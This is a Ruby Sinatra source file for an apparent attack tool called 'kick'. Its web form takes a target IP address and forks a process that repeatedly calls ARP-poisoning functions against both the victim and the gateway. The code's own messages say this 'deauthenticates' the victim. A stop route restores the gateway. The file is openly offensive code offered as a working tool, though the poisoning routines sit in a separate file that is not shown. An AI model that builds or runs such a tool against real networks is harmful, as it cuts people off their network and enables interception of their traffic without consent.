# web.rb
#
#   Execute the kick sinatra-based web service!

require 'rubygems' if RUBY_VERSION < "1.9"

require 'sinatra/base'
require 'sinatra/reloader'
require 'erb'

require_relative 'poison.rb'

$child_pid = nil
$address = nil

class KickApp < Sinatra::Base

  # Configure and register reloader to reload on changes
  configure :development do
    set :logging, false
    set :public_folder, File.dirname(__FILE__) + '../views'
    register Sinatra::Reloader
  end

  before do
    @iface = settings.iface.to_s
    @mac = settings.mac.to_s
    @gateway_ip = settings.gateway_ip.to_s
    @gateway_mac = settings.gateway_mac.to_s
  end

  # Default / path
  get '/' do
    Socket.do_not_reverse_lookup = false
    @head = "Welcome to kick, #{Socket.gethostname}!"
    erb :index
  end

  post '/' do
    $address = "#{params['ip']}".gsub(/\s+/, "")

    $child_pid = Process.fork do
      while true

        Signal.trap("SIGHUP") {
          puts "Killing deauthentication child process!"
          Process.exit
        }
        sleep 1
        puts "Deauthenticating... #{$address}"

        poison_victim(@iface, @mac, @gateway_ip, $address)
        poison_router(@iface, @mac, @gateway_ip, @gateway_mac, $address)

      end
    end

    Process.detach $child_pid

    @deauth_text = "Deauthenticating #{$address}"
    erb :index

  end

  get '/stop' do
    Process.kill("SIGHUP", $child_pid)

    restore(@iface, @mac, @gateway_ip, @gateway_mac, $address)

    @deauth_text = "Stopped and restored gateway!"
    erb :index
  end

end
